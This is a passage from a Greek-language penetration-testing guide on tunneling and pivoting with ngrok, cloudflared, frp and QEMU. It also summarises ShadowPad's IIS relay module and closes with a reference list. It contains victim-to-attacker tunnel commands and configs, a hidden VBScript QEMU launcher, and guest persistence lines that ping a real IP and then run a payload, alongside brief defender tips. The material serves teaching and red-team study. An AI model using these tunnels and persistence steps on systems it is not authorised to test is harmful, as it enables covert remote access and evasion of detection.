tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Ο agent υποστηρίζει επίσης επιλογές authentication και TLS όταν χρειάζεται.<sup>[[39]](#references)</sup>_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Έκθεση αρχείων μέσω HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Παρακολούθηση κλήσεων HTTP

_Χρήσιμο για XSS,SSRF,SSTI ..._\
Ο standalone agent εκθέτει το HTTP inspection interface του στη διεύθυνση `http://127.0.0.1:4040` από προεπιλογή· το interface αφορά την HTTP traffic.<sup>[[40]](#references)</sup>

#### Tunneling εσωτερικής HTTP υπηρεσίας

Η επιλογή `--host-header=rewrite` επανεγγράφει το upstream HTTP `Host` header ώστε να αντιστοιχεί στην τοπική υπηρεσία.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### απλό παράδειγμα διαμόρφωσης ngrok.yaml

Χρησιμοποιεί το ngrok Agent Config v2· τα named tunnels χρησιμοποιούν `proto` και `addr` και εκκινούνται με `ngrok start`.<sup>[[42]](#references)</sup> Ανοίγει 3 tunnels:

- 2 TCP
- 1 HTTP με έκθεση στατικών αρχείων από το /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Ο connector `cloudflared` του Cloudflare Tunnel δημιουργεί εξερχόμενες συνδέσεις· οι δημοσιευμένες εφαρμογές μπορούν να δρομολογούν HTTP, HTTPS, TCP, SSH και RDP, ενώ τα quick tunnels προορίζονται για ανάπτυξη HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy mode)

Η legacy σημαία `--socks5` ενημερώνει το `cloudflared` ότι το local origin χρησιμοποιεί SOCKS5· δεν δημιουργεί local SOCKS5 listener. Για ένα managed tunnel, το `originRequest.proxyType: socks` ρυθμίζει τη διαχείριση του SOCKS5 origin.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Persistent tunnels με DNS

Η τοπικά διαχειριζόμενη διαμόρφωση tunnel χρησιμοποιεί τα πεζά κλειδιά `tunnel`, `credentials-file` και `url`, όπως φαίνεται παρακάτω.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Εκκινήστε το connector:
```bash
cloudflared tunnel run mytunnel
```
Ο connector δημιουργεί outbound connections και, από προεπιλογή, πραγματοποιεί negotiation για QUIC με fallback σε HTTP/2· μην υποθέτετε ότι κάθε deployment χρησιμοποιεί TCP/443. Εκτελέστε τον με μόνο τα privileges που απαιτούνται από το deployment σας.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

Το [`frp`](https://github.com/fatedier/frp) είναι ένα reverse proxy γραμμένο σε Go που υποστηρίζει **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX και XTCP**. Το XTCP χρησιμοποιεί P2P hole punching, η επιτυχία του οποίου εξαρτάται από το NAT. Από την έκδοση **v0.53.0** μπορεί να λειτουργεί ως **SSH Tunnel Gateway**, επιτρέποντας σε ένα target host να χρησιμοποιεί τον stock OpenSSH client χωρίς binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Χρήση του νέου SSH gateway (χωρίς δυαδικό frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Η παραπάνω εντολή δημοσιεύει τη θύρα **8080** του victim ως **attacker_ip:9000**, χρησιμοποιώντας το stock OpenSSH client, ενώ το `frps` παρέχει το gateway.<sup>[[50]](#references)</sup>

## Κρυφά Tunnels βασισμένα σε VM με QEMU

Το user-mode networking του QEMU δεν απαιτεί root ή administrator privilege για το virtual network, και το `-netdev user,hostfwd=...` ανακατευθύνει συνδέσεις TCP, UDP ή UNIX από το host στο guest.<sup>[[51]](#references)</sup> Το TrustedSec τεκμηρίωσε ένα Tiny Core QEMU VM και μια απόπειρα reverse SSH tunnel σε ένα περιστατικό όπου το host-focused EDR ενδέχεται να μην εντοπίσει δραστηριότητα μέσα στο guest.<sup>[[1]](#references)</sup>

### Γρήγορη one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Η παραπάνω εντολή εκκινεί ένα guest **Tiny Core Linux** με 256 MiB μνήμης guest και ένα qcow2 disk image· το disk image δεν είναι in-RAM disk.
• Η θύρα **2222/tcp** στο Windows host προωθείται διαφανώς στη **22/tcp** μέσα στο guest.
• Από την οπτική γωνία του attacker, το target εκθέτει απλώς τη θύρα 2222· όλα τα πακέτα που φτάνουν σε αυτήν υποβάλλονται σε επεξεργασία από τον SSH server που εκτελείται στο VM.

### Κρυφή εκκίνηση μέσω VBScript

Η TrustedSec παρατήρησε εκκινήσεις QEMU μέσω VBS και images Tiny Core στο περιστατικό που αναφέρεται παραπάνω.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Η εκτέλεση του script με `cscript.exe //B update.vbs` διατηρεί το παράθυρο κρυφό.<sup>[[1]](#references)</sup>

### Persistence εντός guest

Το αναφερόμενο περιστατικό περιγράφει persistence στον stateless Tiny Core guest μέσω των `/opt/bootlocal.sh` και `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Απόθεσε το payload στο `/opt/123.out`
2. Πρόσθεσε στο `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Πρόσθεσε τα `home/tc` και `opt` στο `/opt/filetool.lst`, ώστε το payload να συμπεριληφθεί στο `mydata.tgz` κατά τον τερματισμό λειτουργίας.

### Θέματα telemetry

• Ο host εξακολουθεί να εκθέτει τη διεργασία QEMU, το qcow2 image και οποιονδήποτε listener έχει προωθηθεί από τον host.
• Τα process scans που εκτελούνται μόνο στον host ενδέχεται να μην ελέγχουν τις διεργασίες του guest, όμως το virtualization δεν εγγυάται evasion· τα network, QEMU και image telemetry μπορούν ακόμη να το αποκαλύψουν.<sup>[[1]](#references)[[51]](#references)</sup>

### Συμβουλές για defenders

• Δημιούργησε alert για **μη αναμενόμενα QEMU/VirtualBox/KVM binaries** σε paths με δυνατότητα εγγραφής από τους χρήστες.
• Απέκλεισε outbound connections που προέρχονται από το `qemu-system*.exe`.
• Αναζήτησε σπάνια listening ports (2222, 10022, …) που κάνουν bind αμέσως μετά την εκκίνηση του QEMU.

## IIS/HTTP.sys relay nodes μέσω `HttpAddUrl` (ShadowPad)

Η Check Point περιγράφει το IIS module του ShadowPad ως μηχανισμό που μετατρέπει compromised perimeter web servers σε backdoor και relay nodes, κάνοντας bind σε URL prefixes μέσω του `HttpAddUrl`.<sup>[[3]](#references)</sup>

Η ίδια αναφορά περιγράφει τα defaults, τους wildcard listeners, την αποκρυπτογράφηση packets, τα relay queues και το debug telemetry που συνοψίζονται παρακάτω.<sup>[[3]](#references)</sup>

* **Config defaults** – αν το JSON config του module παραλείπει τιμές, χρησιμοποιεί αξιόπιστα IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Με αυτόν τον τρόπο, το benign traffic απαντάται από το IIS με το σωστό branding.
* **Wildcard interception** – οι operators παρέχουν μια λίστα URL prefixes χωρισμένων με ελληνικά ερωτηματικά (wildcards σε host + path). Το module καλεί το `HttpAddUrl` για κάθε entry, οπότε το HTTP.sys δρομολογεί τα matching requests στον malicious handler· τα nonmatching requests επιστρέφουν στην κανονική συμπεριφορά του IIS.
* **Encrypted first packet** – τα δύο πρώτα bytes του request body περιέχουν το seed για ένα custom 32-bit PRNG. Κάθε επόμενο byte γίνεται XOR με το παραγόμενο keystream πριν από το protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – το module διατηρεί δύο lists: “servers” (upstream nodes) και “clients” (downstream implants). Τα entries αφαιρούνται αν δεν ληφθεί heartbeat εντός περίπου 30 δευτερολέπτων. Όταν και οι δύο lists δεν είναι κενές, αντιστοιχίζει τον πρώτο healthy server με τον πρώτο healthy client και μεταφέρει απλώς bytes μεταξύ των sockets τους μέχρι να κλείσει η μία πλευρά.
* **Debug telemetry** – το προαιρετικό logging καταγράφει τη source IP, τη destination IP και το σύνολο των forwarded bytes για κάθε pairing. Οι investigators χρησιμοποίησαν αυτά τα breadcrumbs για να ανασυνθέσουν το ShadowPad mesh που εκτεινόταν σε πολλαπλά victims.

---

## Άλλα tools προς έλεγχο

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Κρυμμένοι στις σκιές: Covert Tunnels μέσω QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Πριν από το ToolShell: Διερεύνηση των προηγούμενων ransomware operations του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Μέσα στον Ink Dragon: Αποκάλυψη του relay network και των εσωτερικών λειτουργιών μιας stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Παράκαμψη περιορισμών Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting στο Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Τεκμηρίωση του Metasploit socks_proxy module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Τεκμηρίωση του Metasploit autoroute module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Τεκμηρίωση Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Υλοποίηση και προδιαγραφή](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Επισκόπηση Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Παράμετροι προέλευσης Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Ρύθμιση Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Αρχείο ρυθμίσεων Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Παράμετροι εκτέλεσης Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Τεκμηρίωση δικτύωσης QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
